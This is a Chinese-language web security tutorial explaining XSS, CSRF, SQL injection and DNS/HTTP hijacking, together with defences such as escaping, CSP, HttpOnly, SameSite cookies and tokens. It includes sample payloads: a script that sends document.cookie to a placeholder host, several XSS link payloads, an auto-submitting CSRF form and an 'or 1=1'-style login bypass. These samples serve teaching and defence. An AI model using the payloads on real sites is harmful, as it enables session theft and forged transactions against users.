

## XSS攻击

> XSS （Cross Site Scriptng）是指黑客往HTML文件中或者DOM中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段；

可以理解为XSS攻击就是利用网站使用了 URL 上的参数渲染网页内容，但是没有仔细校验其中的参数内容，导致前端在解析参数时，执行了一些“非法”脚本（一般是发送一些敏感信息到攻击者服务器）

这种攻击的缺点很明显：就是这种攻击一般会留下攻击者的服务器地址溯源

注入恶意脚本可以完成这些事情：

1. 窃取Cookie；
2. 监听用户行为，比如输入账号密码后发给黑客服务器；
3. 在网页中生成浮窗广告；
4. 修改DOM伪造登入表单；

### 存储型XSS型

1. 黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；
2. 用户向网站请求包含了恶意 JavaScript 脚本的页面；
3. 当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器；

场景：

在评论区提交一份脚本代码，假设前后端没有做好转义工作，那内容上传到服务器，在页面渲染的时候就会直接执行，相当于执行一段未知的JS代码。这就是存储型 XSS 攻击；

### 反射型XSS型

> 反射型 XSS 攻击指的就是恶意脚本作为网络请求的一部分，随后网站又把恶意的JavaScript脚本返回给用户，当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作；

场景：

```javascript
http://TianTianUp.com?query=<script>alert(document.cookie)</script>
```

服务器拿到后解析参数query，最后将内容返回给浏览器，浏览器将这些内容作为HTML的一部分解析，发现是Javascript脚本，直接执行，这样子被XSS攻击了；

这也就是反射型名字的由来，将恶意脚本作为参数，通过网络请求，最后经过服务器，在反射到HTML文档中，执行解析；

### DOM型

> 基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的，黑客通过各种手段将恶意脚本注入用户的页面中，在数据传输的时候劫持网络数据包；

假设网站默认语言是可以根据网址的参数参数 lang= English 来渲染的，此时我们将网址的 default 参数改成下面这种，那估计就会出问题了：

```javascript
?lang=<script>(function(){ const xhr = new XMLHttpRequest(); xhr.open('GET', 'http://xxx.com?a=' + document.cookie); xhr.send() })()</script>
```

上面这种情况，一般在代码里对页面参数进行判断，对 < script > 标签进行处理，避免执行恶意脚本



```html
<a href="http://www.evil.com/?test=" οnclick=alert(1)"" >test</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=" >test</a>
<a href=# οnclick="funcA('');alert(/xss/);//')" >test</a>
```

常见的劫持手段有：

- WIFI路由器劫持；
- 本地恶意软件；

### 解决方法

> XSS 攻击原理都有一个共同点：让恶意脚本直接在浏览器执行；

#### 对脚本进行过滤或转码

> 对用户输入的信息进行过滤或者转码；

```javascript
&lt;script&gt;alert(&#39;你受到XSS攻击了&#39;)&lt;/script&gt;
```

#### CSP

> 内容安全策略，核心思想就是服务器决定浏览器加载哪些资源；
>
> 该实现基于一个 Content-Security-Policy 的 HTTP 首部；

实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，它的实现和执行全部由浏览器完成，开发者只需提供配置；

1. 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；
2. 禁止向第三方域提交数据，这样用户数据也不会外泄；
3. 提供上报机制，能帮助我们及时发现 XSS 攻击；
4. 禁止执行内联脚本和未授权的脚本；

##### 限制方式

1. default-src限制全局；
2. 制定限制类型；
   - 资源类型有：connect-src、mainfest-src、img-src、font-src、media-src、style-src、frame-src、script-src…

#### HttpOnly

由于很多 XSS 攻击都是来盗用 Cookie 的，可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全，这样子JavaScript 便无法读取 Cookie 的值；

```javascript
Set-Cookie: JSESSIONID=xxxxxx;Path=/;Domain=book.com;HttpOnly
```

## CSRF攻击

> 跨站请求伪造（Cross-site request forgery）是指黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事；

CSRF 是一种劫持受信任用户向服务器发送非预期请求的攻击方式，是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作；

### 特点

1. 攻击一般发起在第三方网站，而不是被攻击的网站，被攻击的网站无法防止攻击发生；
2. 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作，而不是直接窃取数据；
3. 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用“；
4. 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等，部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪；

### 自动发起POST请求

黑客网页中有一个表单，自动提交的表单:

```javascript
<form action="http://bank.example/withdraw" method=POST>
  <input type="hidden" name="account" value="xiaoming" />
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="for" value="hacker" />
</form>
<script> document.forms[0].submit(); </script> 
```

访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作；

会携带相应的用户 cookie 信息，让服务器误以为是一个正常的用户在操作，让各种恶意的操作变为可能；

### 引诱用户点击链接

这种需要诱导用户去点击链接才会触发，这类的情况比如在论坛中发布照片，照片中嵌入了恶意链接，或者是以广告的形式去诱导，比如：

```javascript
<a href="www.icbc.com.cn/transfer?toBankId=黑客的账户&money=金额">
```

如果这个用户恰好登录了icbc.com，那他的cookie还在，当他禁不住诱惑，点了这个链接后，一个转账操作就神不知鬼不觉的发生了；

### 解决方法

> 保护的关键就是在请求中放入黑客所不能伪造的信息；

#### 用户操作限制

1. CSRF 攻击往往是在用户不知情的情况下构造了网络请求；
2. 验证码会强制用户必须与应用进行交互，才能完成最终请求；

#### Referer Check

在服务器端验证请求来源的站点：通过HTTP请求头中的Header：Origin Header 和 Referer Header，服务器通过解析这两个Header中的域名，确定请求的来源域；

1. orgin 只包含域名信息，Referer 包含了具体的 URL 路径；
2. 这两者都是可以伪造的，通过AJax中自定义请求头，安全性略差；

#### SameSite

> SameSite 是 HTTP 响应头 Set-Cookie 的属性，它允许声明该 Cookie 是否仅限于第一方或同一站点上下文；

SameSite 可以设置为三个值：

1. Strict：在此模式下，浏览器完全禁止第三方请求携带 Cookie，比如 xxx.com 网站只能在 xxx.com 域名当中请求才能携带 Cookie，其它网站的请求都不行；
2. Lax：在此模式下，只能在 get 方法提交表单 或 a 标签发送 get 请求时可以携带 Cookie，其它情况均不能；
3. None：在些模式下，Cookie 在所有上下文中发送，即允许跨域发送；

#### Token验证

攻击者无法直接窃取到用户的信息，只是冒用Cookie中的信息，可以使用Token；

1. 用户打开页面的时候，服务器给用户生成一个Token，该Token通过加密算法进行加密；
2. 在提交时Token不能再放在Cookie中了（XSS可能会获取Cookie）；
3. Token还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token；
4. 页面提交的请求携带这个Token，服务器验证Token是否正确；

## SQL注入

> SQL 注入是针对程序员编写的疏忽，通过 SQL 语句实现无账号登陆，甚至篡改数据库；

假设查询数据库用户表中是否存在用户名为userName变量，密码为password变量的用户：

```java
const sql = 'select * from user_table where username= "'+ userName +'" and password = "' + password + '"';
```

但是如果黑客输入的密码是1"or"1"="1 就会出现问题, 这是一条永远可以执行成功的sql：

```javascript
const userName = 'yd';
const password = '1"or"1"="1';

const sql = 'select * from user_table where username= "'+ userName +'" and password = "' + password + '"';

// select * from user_table where username= "yd" and password = "1" or"1"="1"
```

## 请求劫持

### DNS劫持

DNS 服务器就是域名服务器，它会把域名转换为 ip 地址，如果这个地址被篡改了，那跳转的网站就不是目的网站，我们电脑中有一个 host 文件，就是本地 DNS，这个 host 文件会被篡改；

### HTTP劫持

HTTP本身是明文传输，并且传输的工程中很可能中间的某一环节被篡改；

#### 